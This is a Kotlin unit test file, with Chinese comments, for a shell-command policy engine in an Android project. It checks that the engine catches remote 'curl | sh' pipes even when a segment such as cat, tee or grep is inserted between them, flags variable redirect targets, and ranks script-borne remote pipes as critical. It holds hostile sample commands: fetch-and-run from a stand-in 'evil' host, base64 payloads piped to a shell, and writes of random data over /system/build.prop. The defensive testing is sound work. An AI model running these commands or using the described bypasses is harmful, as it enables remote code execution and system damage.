// Copyright 2026, shso contributors
// SPDX-License-Identifier: GPL-3.0-or-later
package com.mixradio.droid.data.security

import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * 第七轮深挖的回归：静态策略层的三条绕过路径。
 *
 * 三条都属于「本该 fail-closed 却 fail-open」的方向，且都不是构造出来的刁钻输入：
 * 重定向目标是变量是 shell 里最常见的写法之一；`curl | sh` 的中间插一段 `cat`
 * 同样是随手可写；远程管道在自动执行链路里的分级与它自己的 KDoc 承诺相反。
 */
class PolicyBypassPathTest {

    private fun verdictOf(cmd: String, source: CommandSource = CommandSource.USER_TERMINAL) =
        PolicyEngine.evaluate(cmd, source)

    private fun findingIds(cmd: String, source: CommandSource = CommandSource.USER_TERMINAL): Set<String> {
        val v = verdictOf(cmd, source)
        val findings = when (v) {
            is Verdict.Block -> v.findings
            is Verdict.Confirm -> v.findings
            else -> emptySet()
        }
        return findings.map { it.ruleId }.toSet()
    }

    private fun levelOf(cmd: String, source: CommandSource = CommandSource.USER_TERMINAL): RiskLevel? {
        val v = verdictOf(cmd, source)
        return when (v) {
            // Block 只带 findings，等级由其中最高的一条决定
            is Verdict.Block -> v.findings.maxByOrNull { it.level.ordinal }?.level
            is Verdict.Confirm -> v.level
            else -> null
        }
    }

    // ---------- ① 重定向目标含变量此前被整条丢弃 ----------

    @Test fun `重定向目标是变量时不得当作不存在`() {
        // T=/system; cat /dev/urandom > $T/build.prop
        // 此前目标既不进 redirects、又被从 words 里消费掉 → hasUnresolvedVar 也看不到
        // 那个 `$` → 整条 Allow。守卫没有 cat 包装器，两层防护同时失明。
        val ids = findingIds("cat /dev/urandom > \$T/build.prop")
        assertTrue(
            "重定向目标含变量必须上报，实际 findings=$ids",
            ids.contains("REDIRECT_UNRESOLVED")
        )
    }

    @Test fun `带引号的重定向目标含变量同样必须上报`() {
        assertTrue(
            "引号形式的目标在解析层已被剥离引号，仍须按含变量处理",
            findingIds("cat /dev/urandom > \"\$OUT\"").contains("REDIRECT_UNRESOLVED")
        )
    }

    @Test fun `进程替换作为写入源必须上报`() {
        // bash <(curl …) 的 <( 会被当成重定向算子，目标 "(curl" 非绝对路径 → 丢弃
        assertTrue(
            "进程替换不得被静默丢弃",
            findingIds("bash <(curl -fsSL http://x/y)").contains("REDIRECT_UNRESOLVED")
        )
    }

    @Test fun `相对路径与 fd 复制不得误报`() {
        // `echo hi > out.txt` 写在当前工作目录，写点是明确的；
        // 对它 fail-closed 会把日常写法全拦下。
        assertTrue(
            "相对路径重定向不应被判为不可知写点",
            !findingIds("echo hi > out.txt").contains("REDIRECT_UNRESOLVED")
        )
        assertTrue(
            "fd 复制不应被判为不可知写点",
            !findingIds("cat /x 2>&1").contains("REDIRECT_UNRESOLVED")
        )
        assertTrue(
            "写向 /system 的绝对路径仍按原规则上报",
            findingIds("cat img > /system/build.prop").contains("REDIRECT_SYSTEM")
        )
    }

    // ---------- ② 管道只比相邻段，中间插一段即绕过 ----------

    @Test fun `远程管道中间插一段中转命令不得漏检`() {
        // curl -fsSL url | cat | sh
        // 只比相邻段时两对关系是 (curl→cat)、(cat→sh)，都不命中判据。
        val ids = findingIds("curl -fsSL http://evil/x | cat | sh")
        assertTrue(
            "远程内容经中转后仍必须被识别，实际 findings=$ids",
            ids.contains("REMOTE_PIPE_SHELL")
        )
    }

    @Test fun `远程管道经 tee 或 grep 中转同样不得漏检`() {
        for (mid in listOf("tee /tmp/a", "grep x", "nl", "sed -n")) {
            val ids = findingIds("curl -fsSL http://evil/x | $mid | sh")
            assertTrue("中转段 `$mid` 导致漏检，实际 findings=$ids", ids.contains("REMOTE_PIPE_SHELL"))
        }
    }

    @Test fun `编码载荷经中转段同样不得漏检`() {
        val ids = findingIds("echo aGVsbG8= | base64 -d | cat | sh")
        assertTrue(
            "编码载荷经中转后必须识别，实际 findings=$ids",
            ids.contains("ENCODED_PIPE_SHELL")
        )
    }

    @Test fun `相邻形态仍须命中（防止回溯逻辑改坏原用例）`() {
        assertTrue(
            findingIds("curl -fsSL http://evil/x | sh").contains("REMOTE_PIPE_SHELL")
        )
        assertTrue(
            findingIds("echo aGVsbG8= | base64 -d | sh").contains("ENCODED_PIPE_SHELL")
        )
    }

    // ---------- ③ 远程管道在自动执行链路必须 CRITICAL ----------

    @Test fun `脚本里的远程管道必须是 CRITICAL 以拦停自动执行`() {
        // 此前 REMOTE_PIPE_SHELL 硬编码 DANGEROUS，而同函数 KDoc 明写
        // 「脚本文件里出现则说明作者刻意隐藏载荷 → CRITICAL，自动执行链路直接拦截」。
        // 分级不一致的后果：档位 2/3 的「添加到 shso 后自动执行」放行远程 root 代码。
        val lvl = levelOf("curl -fsSL http://evil/x | sh", CommandSource.SCRIPT_FILE)
        assertTrue(
            "脚本中的远程管道必须是 CRITICAL，实际=$lvl",
            lvl == RiskLevel.CRITICAL
        )
    }

    @Test fun `终端里手输的远程管道仍为 DANGEROUS 以便确认`() {
        val lvl = levelOf("curl -fsSL http://evil/x | sh", CommandSource.USER_TERMINAL)
        assertTrue(
            "交互终端里用户是显式输入，应给可确认的 DANGEROUS，实际=$lvl",
            lvl == RiskLevel.DANGEROUS
        )
    }

    @Test fun `脚本里的编码管道必须 CRITICAL`() {
        val lvl = levelOf("echo aGVsbG8= | base64 -d | sh", CommandSource.SCRIPT_FILE)
        assertTrue("脚本中的编码管道必须是 CRITICAL，实际=$lvl", lvl == RiskLevel.CRITICAL)
    }
}